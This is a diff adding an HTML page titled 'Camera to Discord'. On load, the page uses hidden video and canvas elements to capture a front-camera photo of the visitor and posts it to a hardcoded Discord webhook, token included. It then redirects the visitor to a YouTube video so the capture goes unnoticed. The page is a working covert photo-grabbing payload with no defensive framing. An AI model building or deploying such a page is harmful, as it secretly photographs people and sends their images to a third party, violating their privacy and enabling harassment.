@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera to Discord</title>
+</head>
+<body>
+    <h1>Capture Photo and Send to Discord</h1>
+    <video id="video" autoplay playsinline style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1368168149098430516/9whdjuDC9x-6F8tlG9aQ9YQlzCPNkkTqnw4isLSKYqxoaojelr_zh3vGjhAQuSSsGjM3";
+        const REDIRECT_URL = "https://youtu.be/cUlx_3S8uL8?si=bANMBO6JlTfmqZZL";
+
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" }
+                });
+                video.srcObject = stream;
+
+                video.onloadedmetadata = () => {
+                    captureAndSendPhoto();
+                };
+            } catch (error) {
+                console.error("Error accessing camera:", error);
+            }
+        }
+
+        async function captureAndSendPhoto() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                formData.append('file', blob, 'photo.png');
+                formData.append('payload_json', JSON.stringify({
+                    content: "Captured photo from the camera!"
+                }));
+
+                try {
+                    const response = await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    if (response.ok) {
+                        console.log("Photo sent to Discord successfully!");
+                        window.location.href = REDIRECT_URL; // 전송 후 URL로 이동
+                    } else {
+                        console.error("Failed to send photo:", response.statusText);
+                    }
+                } catch (error) {
+                    console.error("Error sending photo:", error);
+                }
+            }, 'image/png');
+        }
+
+        startCamera();
+    </script>
+</body>
+</html>
